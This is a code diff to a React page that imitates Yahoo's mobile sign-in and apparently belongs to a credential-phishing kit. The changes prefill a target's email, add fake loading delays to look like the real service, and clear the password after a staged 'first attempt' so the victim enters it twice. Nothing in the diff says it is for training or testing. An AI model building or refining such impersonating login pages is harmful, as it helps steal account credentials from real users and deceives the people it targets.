@@ -5,13 +5,16 @@ import Spinner from '../../components/common/Spinner';
 interface MobileYahooLoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
+  defaultEmail?: string;
 }
 
-const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
-  const [email, setEmail] = useState('');
+const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSuccess, onLoginError, defaultEmail }) => {
+  const [email, setEmail] = useState(defaultEmail || '');
   const [password, setPassword] = useState('');
   const [showPasswordStep, setShowPasswordStep] = useState(false);
   const [pageReady, setPageReady] = useState(false);
+  const [nextLoading, setNextLoading] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
 
@@ -20,18 +23,29 @@ const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSucc
     return () => clearTimeout(timer);
   }, []);
 
-  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
+  const handleNext = async (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
     if (email) {
+      setNextLoading(true);
+      await new Promise(resolve => setTimeout(resolve, 800));
       setShowPasswordStep(true);
+      setNextLoading(false);
     }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    const result = await handleFormSubmit(e, { email, password, provider: 'Yahoo' });
+    e.preventDefault();
+    if (!password) return;
+    setSubmitting(true);
+    await new Promise(resolve => setTimeout(resolve, 1200));
+    const result = await handleFormSubmit(
+      { preventDefault: () => {} } as React.FormEvent,
+      { email, password, provider: 'Yahoo' }
+    );
     if (result?.isFirstAttempt) {
       setPassword('');
     }
+    setSubmitting(false);
   };
 
   // Use the correct image URL for the logo
@@ -80,15 +94,15 @@ const MobileYahooLoginPage: React.FC<MobileYahooLoginPageProps> = ({ onLoginSucc
             {!showPasswordStep ? (
               <div>
                 <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Username, email, or mobile" required className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
-                <button onClick={handleNext} disabled={!email} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:bg-purple-600 disabled:cursor-not-allowed transition">
-                  Next
+                <button onClick={handleNext} disabled={!email || nextLoading} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:bg-purple-600 disabled:cursor-not-allowed transition">
+                  {nextLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Next'}
                 </button>
               </div>
             ) : (
               <div>
                 <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" required autoFocus className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-purple-500 focus:border-purple-500" />
-                <button type="submit" disabled={isLoading || !password} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:opacity-50 transition">
-                  {isLoading ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
+                <button type="submit" disabled={submitting || isLoading || !password} className="w-full mt-4 py-3 bg-purple-600 text-white font-bold rounded-full hover:bg-purple-700 disabled:opacity-50 transition">
+                  {(submitting || isLoading) ? <Spinner size="sm" color="border-white" className="mx-auto" /> : 'Sign In'}
                 </button>
               </div>
             )}
